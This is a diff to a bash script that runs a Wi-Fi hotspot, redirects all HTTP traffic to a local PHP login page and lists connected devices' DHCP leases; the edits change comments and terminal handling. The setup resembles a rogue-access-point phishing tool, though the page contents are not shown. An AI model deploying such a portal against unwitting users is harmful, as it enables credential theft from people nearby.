@@ -15,7 +15,7 @@ ensure_directories() {
     mkdir -p "$PORTAL_DIR"
     mkdir -p "logs"
 
-    # Create index.php for captive portal
+    # index.php for captive portal
     if [ ! -f "$PORTAL_DIR/index.php" ]; then
 cat > "$PORTAL_DIR/index.php" <<'EOF'
 <?php
@@ -94,7 +94,6 @@ button:hover { background:#1e3c72; }
 EOF
     fi
 
-    # Ensure logs
     touch "$LOG_FILE"
 }
 
@@ -145,7 +144,6 @@ start_hotspot() {
     sudo hostapd $HOSTAPD_CONF -B
     sudo dnsmasq -C $DNSMASQ_CONF
 
-    # Redirect all HTTP traffic to portal
     sudo iptables -t nat -A PREROUTING -i $HOTSPOT_IFACE -p tcp --dport 80 -j DNAT --to-destination 192.168.50.1:80
     sudo iptables -t nat -A POSTROUTING -o $HOTSPOT_IFACE -j MASQUERADE
 
@@ -162,10 +160,22 @@ stop_hotspot() {
     echo "[+] Hotspot stopped."
 }
 
+# ---------------------------
+# Start PHP login page server in another terminal
+# ---------------------------
 start_server() {
     ensure_directories
-    cd "$PORTAL_DIR" || exit
-    php -S 0.0.0.0:80
+    echo "[+] Starting login page server in a new terminal..."
+
+    if command -v gnome-terminal >/dev/null 2>&1; then
+        gnome-terminal -- bash -c "cd '$PORTAL_DIR' && php -S 0.0.0.0:80; exec bash"
+    elif command -v x-terminal-emulator >/dev/null 2>&1; then
+        x-terminal-emulator -e bash -c "cd '$PORTAL_DIR' && php -S 0.0.0.0:80; exec bash"
+    else
+        echo "[!] No supported terminal emulator found. Running in current terminal..."
+        cd "$PORTAL_DIR" || exit
+        php -S 0.0.0.0:80
+    fi
 }
 
 show_devices() { cat /var/lib/misc/dnsmasq.leases 2>/dev/null; }
